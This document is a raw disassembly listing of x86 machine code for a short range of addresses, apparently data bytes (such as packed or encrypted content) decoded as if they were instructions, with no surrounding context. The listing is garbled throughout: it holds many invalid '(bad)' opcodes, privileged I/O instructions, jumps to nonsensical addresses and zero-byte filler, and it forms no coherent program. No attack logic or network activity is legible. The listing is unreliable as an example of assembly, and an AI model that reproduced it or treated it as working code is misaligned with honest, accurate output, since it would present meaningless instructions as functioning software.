  42ce77:	out    0xc5,eax
  42ce79:	push   ebx
  42ce7a:	sar    dl,1
  42ce7c:	out    dx,al
  42ce7d:	leave  
  42ce7e:	push   es
  42ce7f:	cmc    
  42ce80:	jmp    0xeb6cd416
  42ce85:	jmp    0x42ce07
  42ce87:	pop    ecx
  42ce88:	jns    0x42cee2
  42ce8a:	inc    edi
  42ce8b:	add    al,0x85
  42ce8d:	es icebp 
  42ce8f:	xchg   BYTE PTR [esi+0x5e],dh
  42ce92:	les    esi,FWORD PTR [ebx+0x62]
  42ce95:	pop    eax
  42ce96:	les    eax,FWORD PTR [ebx]
  42ce98:	add    BYTE PTR [eax],al
  42ce9a:	add    BYTE PTR [eax],al
  42ce9c:	add    bh,cl
  42ce9e:	(bad)  [esi]
  42cea0:	lea    esi,[edx-0x7704d14f]
  42cea6:	icebp  
  42cea7:	icebp  
  42cea8:	aas    
  42cea9:	jne    0x42cf03
  42ceab:	enter  0xf80b,0x98
  42ceaf:	push   edi
  42ceb0:	jne    0x42ce62
  42ceb2:	pop    eax
  42ceb3:	mov    edi,0x4a834e07
  42ceb8:	aad    0xa3
  42ceba:	jno    0x42ce51
  42cebc:	fld    DWORD PTR [edx]
  42cebe:	inc    esp
  42cebf:	sti    
  42cec0:	mov    dl,0xb2
  42cec2:	mov    ebx,0x905bed0d
  42cec7:	(bad)  
  42cec8:	jae    0x42cf0b
  42ceca:	add    ch,BYTE PTR [esi+0x40]
  42cecd:	cdq    
  42cece:	repnz ins DWORD PTR es:[edi],dx
  42ced0:	std    
  42ced1:	push   esp
  42ced2:	or     DWORD PTR [eax-0x12],ebp
  42ced5:	jne    0x42ced9
  42ced7:	jmp    0xe79aff34
  42cedc:	(bad)  ds:0xf3cf3974
  42cee2:	shr    ebp,1
  42cee4:	fsub   DWORD PTR [esi]
  42cee6:	or     dh,al
  42cee8:	sbb    eax,0x2e74142f
  42ceed:	jns    0x42cf6e
  42ceef:	popf   
  42cef0:	pop    es
  42cef1:	jns    0x42cf40
  42cef3:	hlt    
  42cef4:	jp     0x42ce89
  42cef6:	jge    0x42cf20
  42cef8:	pop    eax
  42cef9:	data16 jg 0x42cf24
  42cefc:	cld    
  42cefd:	sbb    dl,dh
  42ceff:	cwde   
  42cf00:	add    BYTE PTR [eax],0x0
  42cf03:	add    BYTE PTR [eax],al
  42cf05:	add    BYTE PTR [edi],dh
  42cf07:	in     al,0x98
  42cf09:	into   
  42cf0a:	mov    DWORD PTR [edx-0x2d],ebx
  42cf0d:	inc    ebx
  42cf0e:	jne    0x42ce95
  42cf10:	lods   al,BYTE PTR ds:[esi]
  42cf11:	(bad)  
  42cf12:	stc    
  42cf13:	ret    0xf654
  42cf16:	mov    cl,0x85
  42cf18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf19:	sti    
  42cf1a:	mov    esi,eax
  42cf1c:	dec    esp
  42cf1d:	mov    ecx,0xae2daaa4
  42cf22:	aas    
  42cf23:	ret    0xc3f6
  42cf26:	pushf  
  42cf27:	pop    edi
  42cf28:	push   cs
  42cf29:	ret    0x276
  42cf2c:	adc    ebx,esp
  42cf2e:	imul   esp,eax,0x3d2cea1
  42cf34:	mov    ss,ebx
  42cf36:	ror    DWORD PTR [ebp+0x171e8284],0x66
  42cf3d:	push   0x7b1a0301
  42cf42:	jl     0x42cf4a
  42cf44:	fs into 
  42cf46:	outs   dx,DWORD PTR ds:[esi]
  42cf47:	nop
  42cf48:	call   DWORD PTR [eax+0x76]
  42cf4b:	add    al,BYTE PTR [eax]
  42cf4d:	push   0x5d
  42cf4f:	mov    edx,0xfa3cb9ff
  42cf54:	push   esi
  42cf55:	es sub eax,0x76e900b2
  42cf5b:	add    cl,BYTE PTR [ecx+0x188aaac]
  42cf61:	jmp    0x26d:0x5fe7ba2d
  42cf68:	add    BYTE PTR [ebp+0x0],ch
  42cf6b:	add    BYTE PTR [eax],al
  42cf6d:	add    BYTE PTR [eax],al
  42cf6f:	mov    dh,0x36
  42cf71:	sbb    BYTE PTR [edx+0x3d],ah
  42cf74:	mov    dh,0x86
  42cf76:	aaa    
  42cf77:	mov    esi,0x76e903c5
  42cf7c:	mov    ebp,0x4ec31d4c
  42cf81:	lock rol BYTE PTR [ebp-0x52],0x28
  42cf86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf87:	scas   al,BYTE PTR es:[edi]
  42cf88:	test   al,0x42
  42cf8a:	jb     0x42cfb9
  42cf8c:	mov    dl,0x88
  42cf8e:	lods   al,BYTE PTR ds:[esi]
  42cf8f:	inc    edx
  42cf90:	clc    
  42cf91:	ret    0x856c
  42cf94:	mov    DWORD PTR [ebp+edx*8-0x24],edi
  42cf98:	add    eax,DWORD PTR [edi+0x4b8e292c]
  42cf9e:	call   0x3856f6f1
  42cfa3:	retf   0x345
  42cfa6:	icebp  
  42cfa7:	xchg   BYTE PTR [ebp+0x1432114],bh
  42cfad:	add    BYTE PTR [edx+0x3d],ch
  42cfb0:	or     eax,0xdc2a985
  42cfb5:	xchg   DWORD PTR [eax*2-0x96e3678],ebp
  42cfbc:	add    al,0x0
  42cfbe:	jmp    0xc33f1e04
  42cfc3:	cmp    eax,0xf80044bc
  42cfc8:	cmp    al,BYTE PTR [esp+edi*8+0xf]
  42cfcc:	retf   0x4631
  42cfcf:	loopne 0x42d021
  42cfd1:	mov    esi,0xff
  42cfd6:	add    BYTE PTR [eax],al
  42cfd8:	xchg   ecx,eax
  42cfd9:	fiadd  DWORD PTR [ecx+0x43cdd07e]
  42cfdf:	lock int 0xef
  42cfe2:	jmp    0x42cfe5
  42cfe4:	or     ebp,ecx
  42cfe6:	aaa    
  42cfe7:	jge    0x42d009
  42cfe9:	mov    edi,0xcf3b7b86
  42cfee:	cmc    
  42cfef:	pop    ebx
  42cff0:	fstp   TBYTE PTR [ebx-0x47]
  42cff3:	push   esi
  42cff4:	pop    ss
  42cff5:	(bad)  
  42cff6:	add    edi,0x3b934
  42cffc:	mov    WORD PTR [eax+0x3f9b74ba],cs
  42d002:	ds or  ah,cl
  42d005:	fmul   st(0),st
  42d007:	add    al,0x9c
  42d009:	add    al,0x85
  42d00b:	shl    ch,0xb2
  42d00e:	add    edi,0x4fe28007
  42d014:	pop    ebp
  42d015:	add    al,0x0
  42d017:	test   BYTE PTR [edi+edx*2+0x440c3305],bl
  42d01e:	push   esi
  42d01f:	ret    
  42d020:	jg     0x42cfe8
  42d022:	pop    eax
  42d023:	ret    
  42d024:	xchg   ecx,eax
  42d025:	cmp    edi,esp
  42d027:	push   ecx
  42d028:	(bad)  
  42d029:	clc    
  42d02a:	dec    esi
  42d02b:	lea    edx,[ecx+0x3e84ad2]
  42d031:	mov    eax,0xcb97fff8
  42d036:	sub    esi,esi
  42d038:	daa    
  42d039:	into   
  42d03a:	outs   dx,BYTE PTR ds:[esi]
  42d03b:	cmp    al,0x0
  42d03d:	add    BYTE PTR [eax],al
  42d03f:	add    BYTE PTR [eax],al
  42d041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d042:	lock sti 
  42d044:	adc    edi,0x4
  42d047:	jl     0x42d07d
  42d049:	jne    0x42d04e
  42d04b:	cld    
  42d04c:	out    0x65,eax
  42d04e:	outs   dx,BYTE PTR ds:[esi]
  42d04f:	retf   
  42d050:	cli    
  42d051:	outs   dx,DWORD PTR ds:[esi]
  42d053:	push   edx
  42d054:	add    ebp,esp
  42d056:	jns    0x42d0cd
  42d058:	outs   dx,DWORD PTR ds:[esi]
  42d059:	jns    0x42d07f
  42d05b:	iret   
  42d05c:	test   bl,ah
  42d05e:	mov    ch,0xec
  42d060:	mov    BYTE PTR [ebx-0x32fbd2ce],ah
  42d066:	dec    esp
  42d068:	cli    
  42d069:	shr    BYTE PTR [ecx*2-0x7318bfc],cl
  42d070:	cli    
  42d071:	mov    edx,DWORD PTR [ecx-0x7]
  42d074:	fdivr  QWORD PTR [edx+0x78e73500]
  42d07a:	and    al,0xc5
  42d07c:	out    0x7d,al
  42d07e:	cwde   
  42d07f:	(bad)  
  42d080:	cld    
  42d081:	shr    eax,0xcb
  42d084:	cs mov ch,0x80
  42d087:	sub    al,0x57
  42d089:	mov    esp,0x714077ec
  42d08e:	and    al,0xf6
  42d090:	dec    esi
  42d091:	sub    esp,DWORD PTR [eax+0x7c01c881]
  42d097:	cmp    DWORD PTR [edi-0x3fa83717],0x52c724ad
  42d0a1:	(bad)  
  42d0a2:	sar    DWORD PTR [ebx],1
  42d0a4:	fld    QWORD PTR [eax]
  42d0a6:	add    BYTE PTR [eax],al
  42d0a8:	add    BYTE PTR [eax],al
  42d0aa:	pop    edx
  42d0ab:	loopne 0x42d127
  42d0ad:	out    dx,eax
  42d0ae:	clc    
  42d0af:	ficom  WORD PTR [eax+0x4]
  42d0b2:	xchg   DWORD PTR [ecx-0x26],ebp
  42d0b5:	and    ch,BYTE PTR [ebx+0x3aff6e51]
  42d0bb:	test   eax,0x2c1dc279
  42d0c0:	stc    
  42d0c1:	stc    
  42d0c2:	sub    dl,BYTE PTR [edi]
  42d0c4:	jp     0x42d09d
  42d0c6:	or     eax,0x1fa85e02
  42d0cb:	mov    edi,0x101bc76e
  42d0d0:	inc    DWORD PTR [ebx]
  42d0d2:	popf   
  42d0d3:	cwde   
  42d0d4:	call   0xa93645dc
  42d0d9:	fmul   QWORD PTR [ebp+0x4fcb7b0d]
  42d0df:	pusha  
  42d0e0:	push   cs
  42d0e1:	mov    DWORD PTR [ecx-0x75],0x5732357c
  42d0e8:	push   ss
  42d0e9:	retf   
  42d0ea:	mov    ebx,ebx
  42d0ec:	outs   dx,DWORD PTR ds:[esi]
  42d0ed:	dec    ecx
  42d0ee:	sar    eax,1
  42d0f0:	sar    bh,cl
  42d0f2:	dec    esp
  42d0f3:	in     eax,dx
  42d0f4:	pop    ebp
  42d0f5:	add    al,dl
  42d0f7:	(bad)  
  42d0f8:	retf   0x4286
  42d0fb:	loop   0x42d0e5
  42d0fd:	push   ecx
  42d0fe:	mov    WORD PTR [ebp*8-0x66e2157a],gs
  42d105:	retf   0xa29
  42d108:	and    dh,cl
  42d10a:	inc    edx
  42d10b:	sbb    BYTE PTR [ecx+0x3],ch
  42d111:	add    BYTE PTR [eax],al
  42d113:	adc    al,dh
  42d115:	in     al,0x80
  42d117:	retf   0xe634
  42d11a:	retf   0xbe39
  42d11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d11e:	xchg   BYTE PTR [edi+0x7929bdf9],dh
  42d124:	ds push ss
  42d126:	jg     0x42d0d9
  42d128:	mov    esi,0xc12c2e89
  42d12d:	in     al,dx
  42d12e:	add    eax,eax
  42d130:	mov    esp,ecx
  42d132:	xor    al,0xc2
  42d134:	push   ebp
  42d135:	push   ss
  42d136:	retf   
  42d137:	fstp   DWORD PTR [edi+0x48]
  42d13b:	inc    ecx
  42d13c:	cld    
  42d13d:	inc    edx
  42d13e:	add    BYTE PTR [edi+0x32016def],bh
  42d144:	(bad)  
  42d147:	repnz xor eax,0x1bc4e934
  42d14d:	data16 stc 
  42d14f:	repz jge 0x42d175
  42d152:	cmp    DWORD PTR [esi],edi
  42d154:	aaa    
  42d155:	or     BYTE PTR [esi+0x29125605],dl
  42d15b:	jns    0x42d19a
  42d15d:	(bad)  
  42d15e:	cmc    
  42d15f:	cmc    
  42d160:	jge    0x42d1d6
  42d162:	jmp    0xc0f2:0x2afc46bf
  42d169:	aaa    
  42d16a:	mov    dl,0x8c
  42d16c:	push   es
  42d16d:	jl     0x42d1a9
  42d16f:	pop    ebx
  42d170:	inc    esi
  42d171:	cld    
  42d172:	mov    esi,0xedbdcba3
  42d177:	add    BYTE PTR [eax],al
  42d179:	add    BYTE PTR [eax],al
  42d17b:	add    BYTE PTR [esi+0x50],dh
  42d17e:	push   ebx
  42d17f:	bound  ebp,QWORD PTR [esi+0x3be5428e]
  42d185:	mov    dl,0x4f
  42d187:	push   ecx
  42d188:	sbb    DWORD PTR [ecx-0x4a0cc906],edi
  42d18e:	std    
  42d18f:	stos   DWORD PTR es:[edi],eax
  42d190:	test   al,0x3c
  42d192:	ret    
  42d193:	int    0x67
  42d195:	stos   BYTE PTR es:[edi],al
  42d196:	xchg   esi,eax
  42d197:	push   ds
  42d198:	mov    edi,0x70117eb8
  42d19d:	aas    
  42d19e:	add    al,0xda
  42d1a0:	mov    dh,0xa4
  42d1a2:	(bad)  
  42d1a3:	mov    ecx,0x9f5afdb6
  42d1a8:	cmp    eax,DWORD PTR [ebx+eax*2+0x4b846ecd]
  42d1af:	lds    ebp,FWORD PTR [edx-0x7c]
  42d1b2:	aas    
  42d1b3:	in     eax,dx
  42d1b4:	(bad)  [edx+0x4]
  42d1b7:	and    dh,BYTE PTR [esi]
  42d1b9:	call   FWORD PTR ss:[ecx]
  42d1bc:	xor    DWORD PTR [esi+edx*1-0x57],edi
  42d1c0:	clc    
  42d1c1:	fdiv   st(1),st
  42d1c3:	add    BYTE PTR [edi+eax*8-0x473bff9c],cl
  42d1ca:	mov    ds:0x385f1c42,eax
  42d1cf:	call   FWORD PTR [edx+eax*1-0x9]
  42d1d3:	xor    BYTE PTR [edi+esi*8],al
  42d1d6:	les    eax,FWORD PTR [eax]
  42d1d8:	sbb    al,0x86
  42d1da:	mov    esi,0x3f3edf14
  42d1df:	and    al,0x0
  42d1e1:	add    BYTE PTR [eax],al
  42d1e3:	add    BYTE PTR [eax],al
  42d1e5:	and    BYTE PTR [esi],bh
  42d1e7:	inc    edi
  42d1e8:	and    al,0x4
  42d1ea:	repz xor BYTE PTR [eax+edi*4-0x48],0xf5
  42d1f0:	ss pop edi
  42d1f2:	mov    BYTE PTR [edx],0x50
  42d1f5:	dec    edi
  42d1f6:	rol    DWORD PTR [edx],0xe8
  42d1f9:	rol    DWORD PTR ds:0x485c0000,1
  42d1ff:	add    al,0x0
  42d201:	add    cl,BYTE PTR [edx+edi*8-0xa]
  42d205:	test   bh,al
  42d207:	push   ebx
  42d208:	mov    esp,DWORD PTR [eax]
  42d20a:	xchg   esi,esp
  42d20c:	adc    BYTE PTR [edx],cl
  42d20e:	ds jmp 0x42d19c
  42d211:	sar    BYTE PTR [ebp+ecx*2-0x6472e75],cl
  42d218:	dec    esi
  42d219:	mov    BYTE PTR [ebp-0x37],bl
  42d21c:	cmp    BYTE PTR [edx+edx*4-0x2c],ah
  42d220:	jmp    DWORD PTR [ebx-0x7e]
  42d223:	mov    edx,0xfb2d180f
  42d228:	dec    DWORD PTR [ebp+edi*1+0x170f0441]
  42d22f:	ror    DWORD PTR [ecx+0x5d87d019],cl
  42d235:	push   0xd2045709
  42d23a:	push   eax
  42d23b:	mov    DWORD PTR [ebp+0x54],ebx
  42d23e:	(bad)  
  42d240:	xor    dh,BYTE PTR [ebp+0x70]
  42d243:	jnp    0x42d27f
  42d245:	jbe    0x42d295
  42d247:	int3   
  42d248:	mov    BYTE PTR [eax],al
  42d24a:	add    BYTE PTR [eax],al
  42d24c:	add    BYTE PTR [eax],al
  42d24e:	cwde   
  42d24f:	lds    eax,FWORD PTR ds:0x1bfc255d
  42d255:	xchg   DWORD PTR [ebx+0x26],esi
  42d258:	cmp    edi,edi
  42d25a:	jp     0x42d29b
  42d25c:	lock dec edi
  42d25e:	call   0x1292ce4f
  42d263:	mov    bh,0x26
  42d265:	adc    dh,BYTE PTR [ebp+0x71c383a9]
  42d26b:	es mov edi,0x39849973
  42d271:	cld    
  42d272:	(bad)  
  42d273:	out    0xc7,al
  42d275:	jle    0x42d22d
  42d277:	jno    0x42d284
  42d279:	inc    ebp
  42d27a:	in     eax,0xad
  42d27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d27d:	xchg   BYTE PTR [edx+0x76e7b930],dh
  42d283:	pop    esp
  42d284:	enter  0xf1fa,0xe9
  42d288:	dec    ecx
  42d289:	pop    ss
  42d28a:	out    dx,al
  42d28b:	fwait
  42d28c:	cli    
  42d28d:	xchg   BYTE PTR [eax+edx*8-0x5c89c842],dh
  42d294:	pop    esp
  42d295:	cmp    BYTE PTR [esp+ebx*4],dh
  42d298:	mov    DWORD PTR cs:[ebx],esi
  42d29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d29c:	(bad)  
  42d29d:	adc    al,0x29
  42d29f:	mov    ebx,0xe5f6003e
  42d2a4:	repnz cli 
  42d2a6:	xor    BYTE PTR ds:0x206d7c7c,bl
  42d2ac:	cmp    dh,ah
  42d2ae:	imul   BYTE PTR [esi-0x3a]
  42d2b1:	aaa    
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	add    BYTE PTR [eax],al
  42d2b6:	add    BYTE PTR [esi-0x584059c],ch
  42d2bc:	pop    ds
  42d2bd:	cmp    DWORD PTR [esi+ecx*8],eax
  42d2c0:	loop   0x42d2c8
  42d2c2:	call   0xc801d546
  42d2c7:	dec    edi
  42d2c8:	jb     0x42d2b1
  42d2ca:	sub    ch,BYTE PTR [esi+0x76c2a05c]
  42d2d0:	add    bl,BYTE PTR [esi+0x41]
  42d2d3:	cmp    DWORD PTR [ebp+0x27da4ca8],eax
  42d2d9:	jmp    0xe8acf00b
  42d2de:	add    esi,DWORD PTR [ebp-0x59]
  42d2e1:	lahf   
  42d2e2:	test   BYTE PTR [esi-0x58fc131a],bl
  42d2e8:	push   ebx
  42d2e9:	outs   dx,BYTE PTR ds:[esi]
  42d2ea:	int3   
  42d2eb:	repz mov al,0x1c
  42d2ee:	cld    
  42d2ef:	sbb    ah,BYTE PTR [ebp-0x14]
  42d2f2:	add    esi,DWORD PTR [ebp-0x77]
  42d2f5:	sub    DWORD PTR [eax],eax
  42d2f7:	cli    
  42d2f8:	ret    
  42d2f9:	nop
  42d2fa:	out    0xe9,al
  42d2fc:	mov    edx,0x35228071
  42d301:	in     eax,0x11
  42d303:	mov    ch,0xa6
  42d305:	adc    edi,DWORD PTR [ebx+0x3c]
  42d308:	push   es
  42d309:	test   al,0x5a
  42d30b:	mov    esp,0x9db440f9
  42d310:	mov    edx,0x35fa8049
  42d315:	push   ebp
  42d316:	jnp    0x42d354
  42d318:	push   es
  42d319:	outs   dx,BYTE PTR ds:[esi]
  42d31a:	lds    eax,FWORD PTR [eax]
  42d31c:	add    BYTE PTR [eax],al
  42d31e:	add    BYTE PTR [eax],al
  42d320:	adc    eax,edx
  42d322:	lock add dh,BYTE PTR [edi+0x28]
  42d326:	icebp  
  42d327:	inc    esp
  42d328:	inc    esi
  42d329:	push   edx
  42d32a:	jo     0x42d362
  42d32c:	jns    0x42d2e9
  42d32e:	repz aaa 
  42d330:	addr16 inc edx
  42d332:	jmp    0x595089b9
  42d337:	add    eax,0x275c1e
  42d33c:	jne    0x42d38d
  42d33e:	outs   dx,BYTE PTR ds:[esi]
  42d33f:	fsubr  st,st(3)
  42d341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d342:	jmp    FWORD PTR [eax+0x25748790]
  42d348:	cmp    DWORD PTR [edx-0x7e891702],edx
  42d34e:	dec    esp
  42d34f:	icebp  
  42d350:	lods   al,BYTE PTR ds:[esi]
  42d351:	add    eax,DWORD PTR [edi-0x572e151]
  42d357:	into   
  42d358:	xor    ebx,DWORD PTR [ecx+ecx*8-0x55]
  42d35c:	xor    bh,BYTE PTR [edx-0x4e51e9ac]
  42d362:	xchg   BYTE PTR [eax-0x16e40bc2],bh
  42d368:	jbe    0x42d2f5
  42d36a:	inc    edx
  42d36b:	in     eax,dx
  42d36c:	(bad)  
  42d36d:	js     0x42d356
  42d36f:	dec    esi
  42d370:	xor    bh,BYTE PTR [ebp+0x36366dfa]
  42d376:	adc    al,0x2
  42d378:	sub    esi,edx
  42d37a:	(bad)  
  42d37b:	mov    ecx,0x1752fa4c
  42d380:	mov    dl,0xe
  42d382:	dec    esp
  42d383:	fild   WORD PTR [eax]
  42d385:	add    BYTE PTR [eax],al
  42d387:	add    BYTE PTR [eax],al
  42d389:	add    bh,BYTE PTR ss:[edi-0x5b]
  42d38d:	loop   0x42d3f8
  42d38f:	add    dh,al
  42d391:	cwde   
  42d392:	jns    0x42d3e8
  42d394:	jb     0x42d338
  42d396:	push   edx
  42d397:	xchg   DWORD PTR [esi+edi*4+0x7611c020],esp
  42d39e:	add    esp,DWORD PTR [edx+0x6a]
  42d3a1:	cmp    esp,edx
  42d3a3:	call   FWORD PTR [ecx+0x2fd78158]
  42d3a9:	xor    eax,0x50b4ffbd
  42d3ae:	and    BYTE PTR [esp+esi*2],al
  42d3b1:	inc    ebx
  42d3b2:	push   ss
  42d3b3:	lea    ebp,[edx+0x16505392]
  42d3b9:	test   DWORD PTR [ecx+0x12],edx
  42d3bc:	test   eax,0xc43976
  42d3c1:	push   0x3b74ba82
  42d3c6:	out    0x82,eax
  42d3c8:	jne    0x42d41e
  42d3ca:	fnsave [esi]
  42d3cc:	std    
  42d3cd:	dec    ebx
  42d3ce:	mov    edi,0xae5ef879
  42d3d3:	fwait
  42d3d4:	rcl    al,0xbe
  42d3d7:	jae    0x42d40d
  42d3d9:	fs stc 
  42d3db:	or     esi,DWORD PTR [ebp+0x3f]
  42d3de:	pop    ebx
  42d3df:	add    al,0x8d
  42d3e1:	arpl   WORD PTR [edx-0x55a072b6],bp
  42d3e7:	dec    edx
  42d3e8:	inc    DWORD PTR [ecx-0xf]
  42d3eb:	or     eax,0x40
  42d3f0:	add    BYTE PTR [eax],al
  42d3f2:	or     al,0x82
  42d3f4:	mov    esi,0xf6f8e20c
  42d3f9:	add    DWORD PTR [ebx],ebx
  42d3fb:	xchg   BYTE PTR ds:0x3b0d7220,bh
  42d401:	and    BYTE PTR [eax-0x50],ah
  42d404:	jp     0x42d483
  42d406:	call   0x7247490f
  42d40b:	cmp    eax,0xf912203a
  42d410:	test   BYTE PTR [ecx],0x72
  42d413:	xor    DWORD PTR [ebp+0x34],0xffffffdc
  42d417:	dec    eax
  42d418:	push   esi
  42d419:	push   0xffffffcc
  42d41b:	das    
  42d41c:	outs   dx,BYTE PTR ds:[esi]
  42d41d:	and    al,0x59
  42d41f:	inc    ebx
  42d420:	and    al,0x56
  42d422:	cld    
  42d423:	mov    ebp,0x44d25813
  42d428:	add    BYTE PTR [ebx-0x3f7c45b0],al
  42d42e:	loopne 0x42d43d
  42d430:	dec    esi
  42d431:	mov    esp,ecx
  42d433:	mov    esp,0xbf591fe2
  42d438:	cmc    
  42d439:	adc    DWORD PTR [esp+eax*1+0x7],0xffffff9d
  42d43e:	jne    0x42d42b
  42d440:	jg     0x42d401
  42d442:	add    bh,cl
  42d444:	push   es
  42d445:	inc    ebp
  42d446:	xor    DWORD PTR [esi],0x268565f0
  42d44c:	cmp    eax,0x411ec524
  42d451:	and    al,0xc5
  42d453:	test   al,0xe9
  42d455:	dec    ebx
  42d456:	add    BYTE PTR [eax],al
  42d458:	add    BYTE PTR [eax],al
  42d45a:	add    BYTE PTR [ebx-0x17],ch
  42d45d:	add    edi,DWORD PTR [edi+0x31]
  42d460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d461:	mov    esp,0xf3ab4244
  42d466:	mov    dl,0xb2
  42d468:	or     eax,0xb5b6395a
  42d46d:	dec    edx
  42d46e:	or     dh,ch
  42d470:	div    bh
  42d472:	jmp    FWORD PTR [ecx-0x4976a35b]
  42d478:	lods   eax,DWORD PTR ds:[esi]
  42d479:	mov    esp,0x78ab1244
  42d47e:	inc    esp
  42d47f:	or     bh,al
  42d481:	sub    cl,cl
  42d483:	aaa    
  42d484:	mov    ds:0xd23566fe,al
  42d489:	sub    al,0x87
  42d48b:	in     al,0x34
  42d48d:	cmc    
  42d48e:	mov    WORD PTR [ecx+0x794177aa],es
  42d494:	add    al,0xc4
  42d496:	aaa    
  42d497:	jbe    0x42d503
  42d499:	pop    es
  42d49a:	rol    DWORD PTR [edi-0x4c],1
  42d49d:	jno    0x42d4e4
  42d49f:	lea    edi,[ebx-0x2a]
  42d4a2:	push   ecx
  42d4a3:	lahf   
  42d4a4:	push   eax
  42d4a5:	(bad)  
  42d4a6:	out    0x77,al
  42d4a8:	sbb    eax,esp
  42d4aa:	xor    DWORD PTR [ebp+0x3bfaf475],0xffffff9d
  42d4b1:	ja     0x42d4fc
  42d4b3:	jns    0x42d479
  42d4b5:	mov    ch,0x37
  42d4b7:	lea    esp,[esi+0x292faa6]
  42d4bd:	ret    
  42d4be:	rol    BYTE PTR [eax],0x0
  42d4c1:	add    BYTE PTR [eax],al
  42d4c3:	add    BYTE PTR [ecx],ah
  42d4c5:	mov    ecx,DWORD PTR [eax+edi*2]
  42d4c8:	xor    DWORD PTR [edx],ecx
  42d4ca:	data16 xlat BYTE PTR ds:[ebx]
  42d4cc:	push   edx
  42d4cd:	push   ebx
  42d4ce:	mov    dl,0x76
  42d4d0:	leave  
  42d4d1:	ficom  DWORD PTR [eax]
  42d4d3:	xchg   ecx,eax
  42d4d4:	push   0xffffffb7
  42d4d6:	call   0x933c1eeb
  42d4db:	(bad)  
  42d4dc:	fdivr  st(3),st
  42d4de:	mov    ch,0xc4
  42d4e0:	sti    
  42d4e1:	jmp    FWORD PTR [ebp+0x51]
  42d4e4:	jge    0x42d46b
  42d4e6:	and    al,0xb
  42d4e8:	ins    DWORD PTR es:[edi],dx
  42d4e9:	test   DWORD PTR [ebx],edi
  42d4eb:	mov    al,0x52
  42d4ed:	call   0x90dd:0x2c7503e8
  42d4f4:	mov    cl,0xa6
  42d4f6:	sbb    BYTE PTR [ecx-0x3ce72547],dl
  42d4fc:	sbb    DWORD PTR [edx-0x2d],0xac837543
  42d503:	adc    al,dh
  42d505:	shl    DWORD PTR [eax],0x16
  42d508:	inc    edx
  42d509:	sub    DWORD PTR [ecx-0x1aa7bc04],0x3f
  42d510:	mov    esi,0x4fc3b082
  42d515:	pop    ebx
  42d516:	mov    al,0xc6
  42d518:	jbe    0x42d51c
  42d51a:	pop    esi
  42d51b:	(bad)  
  42d51c:	shr    DWORD PTR [edi+0x4eabf715],cl
  42d522:	and    BYTE PTR [edx+0x71],ah
  42d525:	cmp    BYTE PTR [edi+esi*8],al
  42d528:	add    BYTE PTR [eax],al
  42d52a:	add    BYTE PTR [eax],al
  42d52c:	add    BYTE PTR [edi+0x612dea8a],bh
  42d532:	test   DWORD PTR [edx+ecx*1+0x3842527d],esp
  42d539:	push   ecx
  42d53a:	push   cs
  42d53b:	cmp    bl,BYTE PTR [ecx]
  42d53d:	cmp    eax,0x76a90010
  42d542:	aaa    
  42d543:	(bad)  
  42d544:	(bad)  
  42d546:	jbe    0x42d5bb
  42d548:	clc    
  42d549:	xor    esi,DWORD PTR [edi]
  42d54b:	ret    
  42d54c:	loope  0x42d4d1
  42d54e:	pop    eax
  42d54f:	add    al,0x95
  42d551:	xchg   ebp,eax
  42d552:	aaa    
  42d553:	enter  0xd60e,0x4d
  42d557:	mov    esi,0xbe7d76ed
  42d55c:	adc    bl,BYTE PTR [esi]
  42d55e:	in     eax,0xcd
  42d560:	mov    al,0xc6
  42d562:	(bad)  
  42d563:	jae    0x42d52b
  42d565:	pushf  
  42d566:	sti    
  42d567:	dec    edi
  42d568:	or     DWORD PTR [eax+eax*1-0x1156df9e],ecx
  42d56f:	jae    0x42d563
  42d571:	inc    eax
  42d572:	retf   
  42d573:	push   ecx
  42d574:	imul   esi,ecx,0x87f76f11
  42d57a:	jo     0x42d56c
  42d57c:	mov    edi,0xef53ee39
  42d581:	outs   dx,BYTE PTR ds:[esi]
  42d582:	cs lock imul edx,ecx,0x367c0b11
  42d58a:	pop    esp
  42d58b:	mov    edi,0x517536db
  42d590:	add    BYTE PTR ds:[eax],al
  42d593:	add    BYTE PTR [eax],al
  42d595:	add    dl,ch
  42d597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d598:	gs cmc 
  42d59a:	jecxz  0x42d559
  42d59c:	es jns 0x42d5f6
  42d59f:	jl     0x42d5b4
  42d5a1:	call   0xddcadb8e
  42d5a6:	ins    BYTE PTR es:[edi],dx
  42d5a7:	inc    edx
  42d5a8:	dec    ebx
  42d5a9:	hlt    
  42d5aa:	or     bl,BYTE PTR [ecx+0x5a]
  42d5ad:	sub    ch,BYTE PTR ds:0x2d72eb7d
  42d5b3:	push   es
  42d5b4:	jg     0x42d5fb
  42d5b6:	into   
  42d5b7:	xchg   BYTE PTR [ecx+esi*1-0x22],dl
  42d5bb:	into   
  42d5bc:	cli    
  42d5bd:	add    BYTE PTR [ebx],dh
  42d5bf:	rol    BYTE PTR [ecx+0x4b849045],0x8
  42d5c6:	adc    DWORD PTR [edx-0x14],ebx
  42d5c9:	call   0x389629
  42d5ce:	out    0xd,al
  42d5d0:	lea    eax,[ebp+0x70]
  42d5d3:	push   ecx
  42d5d4:	lea    eax,[ebp+0x44]
  42d5d7:	push   ecx
  42d5d8:	not    DWORD PTR ds:0x401b24
  42d5de:	fistp  QWORD PTR [ebp+0x98ec906]
  42d5e4:	add    BYTE PTR [ebp-0x29],dl
  42d5e7:	gs jg  0x42d5d6
  42d5ea:	pusha  
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    BYTE PTR [edx+0x58b58d5b],cl
  42d5f3:	ret    
  42d5f4:	cmc    
  42d5f5:	push   DWORD PTR [edi+edx*8]
  42d5f8:	jge    0x42d5f8
  42d5fa:	add    BYTE PTR [eax],al
  42d5fc:	add    BYTE PTR [eax],al
  42d5fe:	add    BYTE PTR [ebx-0x51],al
  42d601:	mov    edx,0xf3eda140
  42d606:	call   0x42d5a3
  42d60b:	xchg   ecx,eax
  42d60c:	jge    0x42d610
  42d60e:	(bad)  
  42d60f:	jecxz  0x42d5d3
  42d611:	dec    edx
  42d612:	dec    DWORD PTR [ecx]
  42d614:	popa   
  42d615:	or     al,0x40
